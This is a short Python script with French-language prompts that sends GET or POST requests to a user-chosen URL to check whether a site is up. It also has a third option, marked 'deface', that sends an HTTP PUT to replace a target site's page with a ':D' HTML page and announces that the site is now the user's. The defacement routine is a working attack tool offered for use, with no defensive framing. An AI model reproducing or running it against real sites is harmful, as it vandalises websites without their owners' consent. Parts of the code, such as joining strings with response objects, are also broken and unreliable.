import requests
import colorama
import os

def app():
 while True:
  red = "\033[91m"
  gre = "\033[92m"
  res = "\033[0m"
  
  os.system("clear")
  print("\n\n")
  print(red + r"""
    |-  |-|  <======
    | | | |     //   v1.0.1 |
    | --- |    //    _______|
    | | | |   //          
    |_| |_|  =====>
  """ + res)
  print("choisir le type de requete pour tester si un site est toujours en ligne, ou une option en rouge pour le defacer (" + red + "http" + res + " conseiller):")
  print("\n\n1 = post\n\n2 = get\n\n" + red + "3 = put (deface)" + res)
  chx = input(":")
  
  if chx == "1":
   ur = input("url cible: ")
   req = requests.post(ur)
   if req.status_code == 200:
    print(gre + "requete post envoyer :D : ",ur, " reponse:",req + res)
   else:
    print(red + "erreur de post", req + res)

  if chx == "2":
   ur = input("l url cible: ")
   req = requests.get(ur)
   if req.status_code == 200:
    print(gre,"requete GET envoyer :D : ",ur,"reponse:", req)
    print("Tapez (x) pour relancer le program")
    reso = input(":")
    if reso == "x":
     app()
    else:
     app()
   else:
    print(red + "erreur de recup", req + res)
    print("Tapez (x) pour relancer le program")
    resei = input(":")
    if resei == "x":
     app()
    else:
     app()

  if chx == "3":
   head = {"Content-Type":"text/html"}
   newc = "<html><meta name='description' content=':D'><title>:D</title><h1 style='font-size: 50px'>:D</h1></html>"
   ur = input("l url cible: ")
   req = requests.put(ur, data=newc, headers=head)
   if req.status_code == 200:
    print("ce site web est a vous maintenant :D : ",ur,req)
    print("Tapez (x) pour relancer le program")
    resa = input(":")
    if resa == "x":
     app() 
   else:
    print(red + "erreur lors du defacing du site web" + res)
    print("Tapez (x) pour relancer le program")
    resae = input(":")
    if resae == "x":
     app()
    else:
     app()
  
app()
